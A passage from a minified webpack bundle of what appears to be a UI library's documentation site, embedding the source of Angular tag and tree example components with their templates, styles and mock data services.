<nui-tag-with-icon-example></nui-tag-with-icon-example>\n</nui-example-wrapper>\n\n<h2>With Hover Effect</h2>\n<p>\n    To add hover effect you can add\n    <code>.nui-tag-with-hover-styles</code> class.\n</p>\n<nui-example-wrapper\n    filenamePrefix="tag-with-hover"\n    exampleTitle="Tag with hover"\n>\n    <nui-tag-with-hover-example></nui-tag-with-hover-example>\n</nui-example-wrapper>\n'},15089:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tag-docs-example",\n    templateUrl: "./tag-docs.example.component.html",\n})\nexport class TagDocsExampleComponent {}\n'},63689:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-tag nui-tag-default nui-tag-with-hover-styles mr-1">\n    Tag default\n</div>\n<div\n    class="nui-tag nui-tag-with-border-critical nui-tag-with-hover-styles mr-1"\n>\n    Tag critical\n</div>\n<div class="nui-tag nui-tag-with-border-warning nui-tag-with-hover-styles mr-1">\n    Tag warning\n</div>\n<div class="nui-tag nui-tag-with-border-info nui-tag-with-hover-styles mr-1">\n    Tag info\n</div>\n<div class="nui-tag nui-tag-with-border-ok nui-tag-with-hover-styles mr-1">\n    Tag ok\n</div>\n<div class="nui-tag nui-tag-with-hover-styles mr-1">Tag default</div>\n<div\n    class="nui-tag nui-tag-critical nui-tag-with-hover-styles nui-tag-text-light mr-1"\n>\n    Tag critical\n</div>\n<div class="nui-tag nui-tag-warning nui-tag-with-hover-styles mr-1">\n    Tag warning\n</div>\n<div\n    class="nui-tag nui-tag-info nui-tag-with-hover-styles nui-tag-text-light mr-1"\n>\n    Tag info\n</div>\n<div\n    class="nui-tag nui-tag-ok nui-tag-with-hover-styles nui-tag-text-light mr-1"\n>\n    Tag ok\n</div>\n'},88693:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-tag {\n    &-critical,\n    &-warning,\n    &-info,\n    &-ok,\n    &-default,\n    .nui-tag-with-hover-styles {\n        border: none;\n    }\n}\n"},14245:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tag-with-hover-example",\n    templateUrl: "./tag-with-hover.example.component.html",\n    styleUrls: ["./tag-with-hover.example.component.less"],\n})\nexport class TagWithHoverExampleComponent {}\n'},45343:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-tag nui-tag-with-icon nui-tag-with-border-critical mr-1">\n    <nui-icon icon="severity_critical" iconSize="small"></nui-icon>\n    Tag critical\n</div>\n<div class="nui-tag nui-tag-with-icon nui-tag-warning mr-1">\n    <nui-icon icon="customize" iconColor="black" iconSize="small"></nui-icon>\n    Tag warning\n</div>\n<div class="nui-tag nui-tag-with-icon mr-1">\n    <nui-icon icon="key" iconColor="black" iconSize="small"></nui-icon>\n    Tag label\n</div>\n'},92747:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-tag-warning {\n    border: none;\n}\n"},68551:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tag-with-icon-example",\n    templateUrl: "./tag-with-icon.example.component.html",\n    styleUrls: ["./tag-with-icon.example.component.less"],\n})\nexport class TagWithIconExampleComponent {}\n'},79323:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ScrollingModule } from "@angular/cdk/scrolling";\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport { NuiDocsModule, NuiIconModule, SrlcStage } from "@nova-ui/bits";\n\nimport { TagBasicExampleComponent } from "./tag-basic/tag-basic.example.component";\nimport { TagBorderColorExampleComponent } from "./tag-border-color/tag-border-color.example.component";\nimport { TagColorExampleComponent } from "./tag-color/tag-color.example.component";\nimport { TagDocsExampleComponent } from "./tag-docs/tag-docs.example.component";\nimport { TagWithHoverExampleComponent } from "./tag-with-hover/tag-with-hover.example.component";\nimport { TagWithIconExampleComponent } from "./tag-with-icon/tag-with-icon.example.component";\n\nconst routes = [\n    {\n        path: "",\n        component: TagDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n];\n\n@NgModule({\n    declarations: [\n        TagBasicExampleComponent,\n        TagDocsExampleComponent,\n        TagColorExampleComponent,\n        TagWithIconExampleComponent,\n        TagBorderColorExampleComponent,\n        TagWithHoverExampleComponent,\n    ],\n    imports: [\n        NuiDocsModule,\n        ScrollingModule,\n        NuiIconModule,\n        RouterModule.forChild(routes),\n    ],\n    exports: [RouterModule],\n})\nexport class TagModule {}\n'},47863:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Injectable } from "@angular/core";\nimport { Observable, of } from "rxjs";\nimport { delay } from "rxjs/operators";\n\ninterface FoodNode {\n    name: string;\n    page?: number;\n    children?: FoodNode[];\n    isLoading?: boolean;\n    hasPagination?: boolean;\n}\n\ninterface IApiResponse {\n    items: FoodNode[];\n    total: number;\n}\n\n@Injectable()\nexport class HttpMockService {\n    private fruitsList = [\n        $localize`apple`,\n        $localize`orange`,\n        $localize`banana`,\n        $localize`watermelon`,\n        $localize`peach`,\n        $localize`pineapple`,\n        $localize`lemon`,\n        $localize`mango`,\n    ];\n    private vegetablesList = [\n        $localize`tomato`,\n        $localize`cucumber`,\n        $localize`cabbage`,\n        $localize`pepper`,\n        $localize`carrot`,\n        $localize`onion`,\n        $localize`broccoli`,\n        $localize`corn`,\n    ];\n\n    private totalItems = 1337;\n\n    getNodeItems(\n        nodeId: string,\n        page: number,\n        pageSize: number\n    ): Observable<IApiResponse> {\n        // nodeId can be handled on API depending on app needs\n        const itemList =\n            nodeId === "Vegetables" ? this.vegetablesList : this.fruitsList;\n\n        const items: FoodNode[] = Array.from({ length: pageSize }).map(() => ({\n            name: this.getRandomFrom(itemList),\n            page,\n        }));\n\n        const response = {\n            items,\n            total: this.totalItems,\n        };\n        return of(response).pipe(delay(1000));\n    }\n\n    private getRandomFrom(list: any[]) {\n        return list[Math.floor(Math.random() * list.length)];\n    }\n}\n'},49323:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./tree-basic/tree-basic.example.component";\nexport * from "./tree-styling/tree-styling.example.component";\nexport * from "./tree-lazy/tree-lazy.example.component";\nexport * from "./tree-checkbox/tree-checkbox.example.component";\nexport * from "./tree-docs/tree-docs.example.component";\nexport * from "./tree-visual-test/tree-visual-test.component";\nexport * from "./tree-leaf-pagination/tree-leaf-pagination.example.component";\nexport * from "./tree-with-additional-content/tree-with-additional-content.example.component";\nexport * from "./tree-show-all-dialog/tree-show-all-dialog.example.component";\nexport * from "./tree-load-more/tree-load-more.example.component";\n'},49649:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<cdk-tree [dataSource]="dataSource" [treeControl]="treeControl">\n    <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n        <button\n            nui-button\n            displayStyle="action"\n            type="button"\n            disabled\n        ></button>\n        {{ node.name }}\n    </cdk-nested-tree-node>\n    <cdk-nested-tree-node\n        *cdkTreeNodeDef="let node; when: hasChild"\n        class="nui-tree"\n    >\n        <div class="nui-tree__header" cdkTreeNodeToggle>\n            <nui-icon\n                class="nui-tree__header-icon"\n                icon="{{\n                    treeControl.isExpanded(node)\n                        ? \'triangle-down\'\n                        : \'triangle-right\'\n                }}"\n            ></nui-icon>\n            <span class="nui-tree__header-title">{{ node.name }}</span>\n        </div>\n        <div\n            class="nui-tree__body"\n            [class.nui-tree__body--collapsed]="!treeControl.isExpanded(node)"\n            [@expandedState]="\n                treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n            "\n        >\n            <ng-container cdkTreeNodeOutlet></ng-container>\n        </div>\n    </cdk-nested-tree-node>\n</cdk-tree>\n'},59197:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n}\n'},18205:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource } from "@angular/cdk/collections";\nimport { NestedTreeControl } from "@angular/cdk/tree";\nimport { Component } from "@angular/core";\n\nimport { expand } from "@nova-ui/bits";\n\ninterface FoodNode {\n    name: string;\n    children?: FoodNode[];\n}\n\nconst TREE_DATA: FoodNode[] = [\n    {\n        name: "Fruit",\n        children: [\n            { name: "Apple" },\n            { name: "Banana" },\n            { name: "Fruit loops" },\n        ],\n    },\n    {\n        name: "Vegetables",\n        children: [\n            {\n                name: "Green",\n                children: [{ name: "Broccoli" }, { name: "Brussels sprouts" }],\n            },\n            {\n                name: "Orange",\n                children: [{ name: "Pumpkins" }, { name: "Carrots" }],\n            },\n            {\n                name: "Red",\n            },\n        ],\n    },\n    {\n        name: "Meat",\n    },\n];\n\n@Component({\n    selector: "nui-tree-basic-example",\n    templateUrl: "tree-basic.example.component.html",\n    styleUrls: ["tree-basic.example.component.less"],\n    host: { id: "nui-tree-basic-example" },\n    animations: [expand],\n})\nexport class TreeBasicExampleComponent {\n    treeControl = new NestedTreeControl<FoodNode>((node) => node.children);\n    dataSource = new ArrayDataSource(TREE_DATA);\n\n    hasChild = (_: number, node: FoodNode): boolean => !!node.children?.length;\n}\n'},33681:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<cdk-tree [dataSource]="dataSource" [treeControl]="treeControl">\n    <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n        <button\n            nui-button\n            displayStyle="action"\n            type="button"\n            title="action"\n            disabled\n        ></button>\n        <nui-checkbox\n            class="leaf-control"\n            [checked]="isParentNodeCheckedOn(node)"\n            (valueChange)="leafItemSelectionToggle(node)"\n            >{{ node.name }}</nui-checkbox\n        >\n    </cdk-nested-tree-node>\n    <cdk-nested-tree-node\n        #nestedNode="cdkNestedTreeNode"\n        *cdkTreeNodeDef="let node; when: hasChild"\n        class="nui-tree"\n    >\n        <div\n            class="nui-tree__header"\n            cdkTreeNodeToggle\n            (click)="loadMore(node, nestedNode)"\n        >\n            <nui-icon\n                class="nui-tree__header-icon"\n                icon="{{\n                    treeControl.isExpanded(node)\n                        ? \'triangle-down\'\n                        : \'triangle-right\'\n                }}"\n            ></nui-icon>\n            <nui-checkbox\n                class="branch-control"\n                (click)="$event.stopPropagation()"\n                [checked]="\n                    descendantsAllSelected(node) || isParentNodeCheckedOn(node)\n                "\n                [indeterminate]="descendantsPartiallySelected(node)"\n                (valueChange)="branchItemSelectionToggle(node)"\n            >\n                <span class="nui-tree__header-title"\n                    >{{ node.name }} ({{ node.length }})</span\n                >\n            </nui-checkbox>\n        </div>\n        <div\n            class="nui-tree__body"\n            [class.nui-tree__body--collapsed]="!treeControl.isExpanded(node)"\n            [@expandedState]="\n                treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n            "\n        >\n            <nui-spinner\n                *ngIf="node.isLoading"\n                [show]="node.isLoading"\n                [delay]="0"\n            ></nui-spinner>\n            <ng-container cdkTreeNodeOutlet></ng-container>\n        </div>\n    </cdk-nested-tree-node>\n</cdk-tree>\n'},35901:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n}\n'},73149:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource, SelectionModel } from "@angular/cdk/collections";\nimport {\n    CdkNestedTreeNode,\n    CdkTree,\n    NestedTreeControl,\n} from "@angular/cdk/tree";\nimport {\n    Component,\n    Injectable,\n    IterableDiffer,\n    IterableDiffers,\n    ViewChild,\n} from "@angular/core";\nimport { Observable, of } from "rxjs";\nimport { delay } from "rxjs/operators";\n\nimport { expand } from "@nova-ui/bits";\n\ninterface ServerNode {\n    name: string;\n    children?: ServerNode[];\n    length?: number;\n    isLoading?: boolean;\n}\n\nconst TREE_DATA: ServerNode[] = [\n    {\n        name: "Servers",\n        children: [],\n        length: 3,\n        isLoading: false,\n    },\n];\n\n@Injectable()\nexport class HttpMock {\n    get(): Observable<ServerNode[]> {\n        const res = {\n            servers: [\n                {\n                    name: "Microsoft Server",\n                    children: [],\n                    length: 3,\n                    load: "ms-servers",\n                },\n                {\n                    name: "Apache Tomcat",\n                    children: [\n                        { name: "Version 1" },\n                        {\n                            name: "Version 2",\n                            children: [],\n                            load: "apache-version-2",\n                            length: 3,\n                        },\n                        { name: "Version 3" },\n                    ],\n                    length: 3,\n                    isLoading: false,\n                },\n                { name: "nginx" },\n            ],\n            "apache-version-2": [\n                { name: "1.0.5" },\n                { name: "2.1.4" },\n                { name: "8.9.0" },\n            ],\n            "ms-servers": [\n                { name: "2019" },\n                { name: "2017" },\n                { name: "2013" },\n            ],\n        };\n        return of(res as any).pipe(delay(3000));\n    }\n}\n\n@Component({\n    selector: "nui-tree-checkbox-lazy",\n    templateUrl: "./tree-checkbox-lazy.component.html",\n    styleUrls: ["./tree-checkbox-lazy.component.less"],\n    animations: [expand],\n    providers: [HttpMock],\n})\nexport class TreeCheckboxLazyComponent {\n    public selectionModel = new SelectionModel<ServerNode>(true);\n    treeControl = new NestedTreeControl<ServerNode>((node) => node.children);\n    dataSource = new ArrayDataSource(TREE_DATA);\n\n    @ViewChild(CdkTree) private cdkTree: CdkTree<ServerNode>;\n\n    hasChild = (_: number, node: ServerNode): boolean => !!node.length;\n\n    constructor(private http: HttpMock, private differ: IterableDiffers) {}\n\n    loadMore(node: any, nestedNode: CdkNestedTreeNode<any>): void {\n        const differ: IterableDiffer<ServerNode> = this.differ\n            .find(node.children)\n            .create();\n\n        if (node.children?.length === node.length || node.isLoading) {\n            return;\n        }\n\n        node.isLoading = true;\n\n        this.http.get().subscribe((res: any) => {\n            node.isLoading = false;\n            node?.load\n                ? (node.children = res[node?.load])\n                : (node.children = res.servers);\n            this.cdkTree.renderNodeChanges(\n                node.children,\n                differ,\n                nestedNode.nodeOutlet.first.viewContainer,\n                node\n            );\n        });\n    }\n\n    public descendantsAllSelected(node: ServerNode): boolean {\n        const descendants = this.treeControl.getDescendants(node);\n        return (\n            descendants.length > 0 &&\n            descendants.every((child) => this.selectionModel.isSelected(child))\n        );\n    }\n\n    public descendantsPartiallySelected(node: ServerNode): boolean {\n        const descendants = this.treeControl.getDescendants(node);\n        const result = descendants.some((child) =>\n            this.selectionModel.isSelected(child)\n        );\n        return result && !this.descendantsAllSelected(node);\n    }\n\n    public branchItemSelectionToggle(node: ServerNode): void {\n        this.selectionModel.toggle(node);\n        const descendants = this.treeControl.getDescendants(node);\n        this.selectionModel.isSelected(node)\n            ? this.selectionModel.select(...descendants)\n            : this.selectionModel.deselect(...descendants);\n\n        descendants.forEach((child) => {\n            this.selectionModel.isSelected(child);\n        });\n        this.checkAllParentsSelection(node);\n    }\n\n    public leafItemSelectionToggle(node: ServerNode): void {\n        this.selectionModel.toggle(node);\n        this.checkAllParentsSelection(node);\n    }\n\n    public isParentNodeCheckedOn(node: ServerNode): boolean {\n        if (\n            this.selectionModel.isSelected(<ServerNode>this.getParentNode(node))\n        ) {\n            this.selectionModel.select(node);\n        }\n        return this.selectionModel.isSelected(node);\n    }\n\n    private checkAllParentsSelection(node: ServerNode): void {\n        let parent: ServerNode | undefined = this.getParentNode(node);\n        while (parent) {\n            this.checkRootNodeSelection(parent);\n            parent = this.getParentNode(parent);\n        }\n    }\n\n    private checkRootNodeSelection(node: ServerNode): void {\n        const nodeSelected = this.selectionModel.isSelected(node);\n        const descendants = this.treeControl.getDescendants(node);\n        const descAllSelected =\n            descendants.length > 0 &&\n            descendants.every((child) => this.selectionModel.isSelected(child));\n        if (nodeSelected && !descAllSelected) {\n            this.selectionModel.deselect(node);\n        } else if (!nodeSelected && descAllSelected) {\n            this.selectionModel.select(node);\n        }\n    }\n\n    private getParentNode(node: ServerNode): ServerNode | undefined {\n        let parent: ServerNode | undefined;\n\n        if (TREE_DATA.find((n) => n === node)) {\n            return;\n        }\n\n        const search = (n: ServerNode): ServerNode | undefined => {\n            if (parent || !n.children) {\n                return;\n            }\n            if (n.children.find((i) => i === node)) {\n                parent = n;\n                return;\n            }\n            return n.children.find(search);\n        };\n\n        TREE_DATA.forEach(search);\n\n        if (!parent) {\n            throw new Error("Parent wasn\'t found");\n        }\n\n        return parent;\n    }\n}\n'},59349:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex justify-content-between">\n    <cdk-tree\n        [dataSource]="dataSource"\n        [treeControl]="treeControl"\n        style="flex: 50%"\n    >\n        <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n            <button\n                nui-button\n                displayStyle="action"\n                type="button"\n                disabled\n            ></button>\n            <nui-checkbox\n                class="leaf-control"\n                [checked]="selectionModel.isSelected(node)"\n                (valueChange)="leafItemSelectionToggle(node)"\n                >{{ node.name }}</nui-checkbox\n            >\n        </cdk-nested-tree-node>\n        <cdk-nested-tree-node\n            *cdkTreeNodeDef="let node; when: hasChild"\n            class="nui-tree"\n        >\n            <div class="nui-tree__header" cdkTreeNodeToggle>\n                <nui-icon\n                    class="nui-tree__header-icon"\n                    icon="{{\n                        treeControl.isExpanded(node)\n                            ? \'triangle-down\'\n                            : \'triangle-right\'\n                    }}"\n                ></nui-icon>\n                <nui-checkbox\n                    class="branch-control"\n                    (click)="$event.stopPropagation()"\n                    [checked]="descendantsAllSelected(node)"\n                    [indeterminate]="descendantsPartiallySelected(node)"\n                    (valueChange)="branchItemSelectionToggle(node)"\n                    >{{ node.item }}</nui-checkbox\n                >\n                <span class="nui-tree__header-title">{{ node.name }}</span>\n            </div>\n            <div\n                class="nui-tree__body"\n                [class.nui-tree__body--collapsed]="\n                    !treeControl.isExpanded(node)\n                "\n                [@expandedState]="\n                    treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n                "\n            >\n                <ng-container cdkTreeNodeOutlet></ng-container>\n            </div>\n        </cdk-nested-tree-node>\n    </cdk-tree>\n\n    <ul class="list-group list-group-striped" style="flex: 50%">\n        <li\n            class="list-group-item"\n            *ngFor="let selected of selectionModel.selected"\n        >\n            {{ selected.name }}\n        </li>\n    </ul>\n</div>\n'},28009:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n}\n'},69457:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource, SelectionModel } from "@angular/cdk/collections";\nimport { NestedTreeControl } from "@angular/cdk/tree";\nimport { Component } from "@angular/core";\n\nimport { expand } from "@nova-ui/bits";\n\ninterface FoodNode {\n    name: string;\n    children?: FoodNode[];\n}\n\nconst TREE_DATA: FoodNode[] = [\n    {\n        name: "Vegetables",\n        children: 